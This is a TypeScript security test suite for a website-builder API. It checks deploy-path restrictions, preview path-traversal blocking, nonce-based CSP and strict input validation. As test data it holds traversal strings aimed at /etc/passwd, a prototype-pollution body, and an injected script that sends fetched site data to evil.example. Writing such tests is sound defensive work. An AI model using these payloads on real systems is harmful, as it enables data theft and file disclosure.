import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { WbCore } from '@wb/core';
import type { FastifyInstance } from 'fastify';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { buildApp } from './app.js';

let dataDir: string;
let core: WbCore;
let app: FastifyInstance;

beforeEach(async () => {
  dataDir = mkdtempSync(join(tmpdir(), 'wb-sec-'));
  core = await WbCore.create({ dataDir });
  app = await buildApp({ core });
});

afterEach(async () => {
  await app.close();
  core.close();
  rmSync(dataDir, { recursive: true, force: true });
});

const makeSite = async (): Promise<string> => {
  const created = (
    await app.inject({ method: 'POST', url: '/sites/from-template', payload: { template: 'breakthrough-medical' } })
  ).json() as { site: { id: string } };
  return created.site.id;
};

describe('publish/deploy cannot touch arbitrary filesystem paths', () => {
  it('publish ignores any client-supplied output directory (no rm -rf of host paths)', async () => {
    const siteId = await makeSite();
    const victim = mkdtempSync(join(tmpdir(), 'wb-victim-'));
    const sentinel = join(victim, 'keep.txt');
    writeFileSync(sentinel, 'precious');

    // Old vulnerability: {outDir} would rm -rf the target before writing.
    const res = await app.inject({
      method: 'POST',
      url: `/sites/${siteId}/publish`,
      payload: { outDir: victim },
    });
    // The extra field is rejected by strict schema (400) OR ignored — either
    // way the victim dir must survive untouched.
    expect([200, 400]).toContain(res.statusCode);
    expect(existsSync(sentinel)).toBe(true);
    expect(readFileSync(sentinel, 'utf8')).toBe('precious');

    // And the real build landed under the managed data dir.
    if (res.statusCode === 200) {
      const body = res.json() as { distPath: string };
      expect(body.distPath).toContain(dataDir);
    }
    rmSync(victim, { recursive: true, force: true });
  });

  it('deploy rejects a client-supplied targetDir', async () => {
    const siteId = await makeSite();
    const res = await app.inject({
      method: 'POST',
      url: `/sites/${siteId}/deploy`,
      payload: { adapter: 'static', targetDir: '/etc/wb-evil' },
    });
    expect(res.statusCode).toBe(400); // strict schema drops the unknown field
    expect(existsSync('/etc/wb-evil')).toBe(false);
  });

  it('static deploy without a targetDir just reports the build path', async () => {
    const siteId = await makeSite();
    const res = await app.inject({
      method: 'POST',
      url: `/sites/${siteId}/deploy`,
      payload: { adapter: 'static' },
    });
    expect(res.statusCode).toBe(200);
    expect((res.json() as { status: string }).status).toBe('prepared');
  });

  it('adapterless deploy without a configured target errors helpfully (422)', async () => {
    const siteId = await makeSite();
    const res = await app.inject({ method: 'POST', url: `/sites/${siteId}/deploy` });
    expect(res.statusCode).toBe(422);
    expect((res.json() as { error: string }).error).toContain('WB_PUBLISH_TARGET');
  });

  it('adapterless deploy with a configured target goes live and returns the URL', async () => {
    const { WbCore } = await import('@wb/core');
    const dir = mkdtempSync(join(tmpdir(), 'wb-live-'));
    const fakeCore = await WbCore.create({
      dataDir: dir,
      publishTarget: {
        name: 'fake',
        deploy: async ({ files }) => ({ url: 'https://clinic.example.com', detail: `${files.size} files` }),
      },
    });
    const liveApp = await buildApp({ core: fakeCore, openapi: false });
    try {
      const created = (
        await liveApp.inject({
          method: 'POST',
          url: '/sites/from-template',
          payload: { template: 'breakthrough-medical' },
        })
      ).json() as { site: { id: string } };
      const res = await liveApp.inject({ method: 'POST', url: `/sites/${created.site.id}/deploy` });
      expect(res.statusCode).toBe(200);
      const body = res.json() as { url: string; target: string; pageCount: number };
      expect(body.url).toBe('https://clinic.example.com');
      expect(body.target).toBe('fake');
      expect(body.pageCount).toBe(4);
    } finally {
      await liveApp.close();
      fakeCore.close();
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe('preview path traversal + asset containment', () => {
  it('cannot escape the asset directory via ../ in the preview path', async () => {
    const siteId = await makeSite();
    for (const attack of [
      `/preview/${siteId}/assets/../../../../etc/passwd`,
      `/preview/${siteId}/assets/..%2f..%2f..%2fetc%2fpasswd`,
      `/preview/${siteId}/assets/....//....//etc/passwd`,
    ]) {
      const res = await app.inject({ url: attack });
      expect(res.statusCode, attack).toBe(404);
      expect(res.body).not.toContain('root:');
    }
  });

  it('serves uploaded assets with a locked-down CSP and nosniff', async () => {
    const siteId = await makeSite();
    const assets = (await app.inject({ url: `/sites/${siteId}/assets` })).json() as Array<{ path: string }>;
    const res = await app.inject({ url: `/preview/${siteId}/assets/${assets[0]!.path}` });
    expect(res.statusCode).toBe(200);
    expect(res.headers['content-security-policy']).toContain("default-src 'none'");
    expect(res.headers['x-content-type-options']).toBe('nosniff');
  });

  it('serves preview HTML under a nonce CSP that blocks an htmlEmbed <script>', async () => {
    const siteId = await makeSite();
    const home = (await app.inject({ url: `/sites/${siteId}/pages` })).json() as Array<{ id: string; rootId: string }>;
    // Inject an htmlEmbed carrying a hostile inline script (renders verbatim).
    const evil = `<script>fetch('/sites').then(r=>r.text()).then(t=>new Image().src='https://evil.example/x?'+t)</script>`;
    await app.inject({
      method: 'POST',
      url: `/sites/${siteId}/pages/${home[0]!.id}/tree/ops`,
      payload: { ops: [{ op: 'insert', parentId: home[0]!.rootId, node: { type: 'htmlEmbed', props: { html: evil } } }] },
    });

    const res = await app.inject({ url: `/preview/${siteId}/` });
    expect(res.statusCode).toBe(200);
    const csp = res.headers['content-security-policy'] as string;
    expect(res.headers['x-content-type-options']).toBe('nosniff');
    // A per-response nonce governs script-src; no 'unsafe-inline'.
    const scriptSrc = csp.split(';').map((d) => d.trim()).find((d) => d.startsWith('script-src'))!;
    const nonce = scriptSrc.match(/'nonce-([^']+)'/)?.[1];
    expect(nonce, csp).toBeTruthy();
    // script-src must NOT allow inline (nonce only), or the hostile script runs.
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(csp).toContain("frame-ancestors 'self'");
    // The injected hostile script is present in the body but carries NO nonce,
    // so the browser refuses to execute it.
    expect(res.body).toContain(evil);
    expect(res.body).not.toContain(`nonce="${nonce}"><script`); // sanity
    // The exact hostile <script> tag has no nonce attribute on it.
    const hostileTag = res.body.slice(res.body.indexOf('<script>fetch'));
    expect(hostileTag.startsWith('<script>')).toBe(true); // bare <script>, unnonced
  });
});

describe('input validation hardening', () => {
  it('rejects unknown body fields via strict schemas', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/sites',
      payload: { name: 'X', __proto__: { admin: true }, extra: 1 },
    });
    expect(res.statusCode).toBe(400);
  });

  it('rejects malformed tree ops with a 422 and does not mutate the page', async () => {
    const siteId = await makeSite();
    const home = (await app.inject({ url: `/sites/${siteId}/pages` })).json() as Array<{ id: string; rootId: string }>;
    const before = await app.inject({ url: `/sites/${siteId}/pages/${home[0]!.id}/tree` });
    const bad = await app.inject({
      method: 'POST',
      url: `/sites/${siteId}/pages/${home[0]!.id}/tree/ops`,
      payload: { ops: [{ op: 'frobnicate', nodeId: 'x' }] },
    });
    expect(bad.statusCode).toBe(400); // discriminated-union validation
    const after = await app.inject({ url: `/sites/${siteId}/pages/${home[0]!.id}/tree` });
    expect(after.body).toBe(before.body);
  });

  it('rejects an invalid slug on page creation', async () => {
    const siteId = await makeSite();
    for (const slug of ['Bad Slug', 'UPPER', '../escape', 'has/slash']) {
      const res = await app.inject({
        method: 'POST',
        url: `/sites/${siteId}/pages`,
        payload: { slug, title: 'T' },
      });
      expect([400, 422], slug).toContain(res.statusCode);
    }
  });

  it('404s for cross-site page and asset access', async () => {
    const a = await makeSite();
    const b = await makeSite();
    const bPages = (await app.inject({ url: `/sites/${b}/pages` })).json() as Array<{ id: string }>;
    // A page id from site B must not resolve under site A.
    const res = await app.inject({ url: `/sites/${a}/pages/${bPages[0]!.id}` });
    expect(res.statusCode).toBe(404);
  });

  it('DELETE of a missing page/asset returns 404 (awaited), not a 204 or crash', async () => {
    const siteId = await makeSite();
    const page = await app.inject({ method: 'DELETE', url: `/sites/${siteId}/pages/does-not-exist` });
    expect(page.statusCode).toBe(404);
    const asset = await app.inject({ method: 'DELETE', url: `/sites/${siteId}/assets/does-not-exist` });
    expect(asset.statusCode).toBe(404);
  });

  it('maps a malformed JSON asset body to 422, not 500', async () => {
    const siteId = await makeSite();
    // Missing `base64` → a raw ZodError from the in-handler .parse(); the error
    // handler must classify it as a client error (422), never a 500.
    const res = await app.inject({
      method: 'POST',
      url: `/sites/${siteId}/assets`,
      payload: { filename: 'x.png', mime: 'image/png' },
    });
    expect(res.statusCode).toBe(422);
    expect((res.json() as { error: string }).error).toMatch(/validation/i);
  });

  it('rejects an empty site name on PATCH with a 400', async () => {
    const siteId = await makeSite();
    const res = await app.inject({ method: 'PATCH', url: `/sites/${siteId}`, payload: { name: '' } });
    expect(res.statusCode).toBe(400); // route schema now requires min(1)
  });

  it('accepts a large base64 asset upload (over Fastify’s 1 MiB default body limit)', async () => {
    const siteId = await makeSite();
    // ~2 MB of raw bytes → ~2.7 MB base64 body; must not 413/500.
    const big = Buffer.alloc(2 * 1024 * 1024, 0x41).toString('base64');
    const res = await app.inject({
      method: 'POST',
      url: `/sites/${siteId}/assets`,
      payload: { filename: 'big.bin', mime: 'application/octet-stream', base64: big },
    });
    expect(res.statusCode).toBe(201);
  });
});
